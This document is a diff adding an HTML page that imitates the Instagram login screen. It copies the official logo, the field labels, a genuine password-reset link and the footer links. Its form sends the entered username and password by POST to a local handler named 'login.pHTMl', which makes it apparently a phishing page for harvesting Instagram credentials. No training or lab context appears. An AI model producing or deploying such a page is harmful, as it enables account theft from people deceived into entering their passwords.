@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+        }
+        .login-container {
+            max-width: 400px;
+            margin: 0 auto;
+        }
+        .brand-logo {
+            max-width: 200px;
+        }
+        .footer-links a {
+            color: #8e8e8e;
+        }
+        .background-img {
+            background-image: url('https://images.hdqwalls.com/wallpapers/blend-purple-abstract-5k-zw.jpg');
+            background-size: cover;
+            background-position: center;
+        }
+    </style>
+</head>
+<body class="bg-gray-100">
+
+    <!-- Background Image Container -->
+    <div class="background-img bg-cover bg-center h-screen flex justify-center items-center">
+        <div class="login-container bg-white shadow-lg rounded-lg p-8">
+
+            <!-- Instagram Logo -->
+            <div class="flex justify-center mb-8">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg" alt="Instagram Logo" class="brand-logo">
+            </div>
+
+            <!-- Login Form -->
+            <form action="login.pHTMl" method="POST">
+                <div class="mb-4">
+                    <label for="username" class="block text-gray-700 text-sm">Phone number, username, or email</label>
+                    <input type="text" name="username" id="username" class="w-full p-3 mt-2 border border-gray-300 rounded-md" placeholder="Username" required>
+                </div>
+
+                <div class="mb-4">
+                    <label for="password" class="block text-gray-700 text-sm">Password</label>
+                    <input type="password" name="password" id="password" class="w-full p-3 mt-2 border border-gray-300 rounded-md" placeholder="Password" required>
+                </div>
+
+                <button type="submit" class="w-full bg-blue-500 text-white py-3 rounded-md hover:bg-blue-600">Log In</button>
+            </form>
+
+            <!-- Forgot Password Link -->
+            <div class="text-center my-4">
+                <a href="https://www.instagram.com/accounts/password/reset/" class="text-sm text-blue-600 hover:underline">Forgot password?</a>
+            </div>
+
+            <!-- Footer Links -->
+            <div class="text-center footer-links text-sm">
+                <a href="#">About</a> | 
+                <a href="#">Help</a> | 
+                <a href="#">Press</a> | 
+                <a href="#">API</a> | 
+                <a href="#">Jobs</a> | 
+                <a href="#">Privacy</a> | 
+                <a href="#">Terms</a> | 
+                <a href="#">Locations</a> | 
+                <a href="#">Top Accounts</a> | 
+                <a href="#">Hashtags</a> | 
+                <a href="#">Language</a>
+            </div>
+        </div>
+    </div>
+
+</body>
+</html>
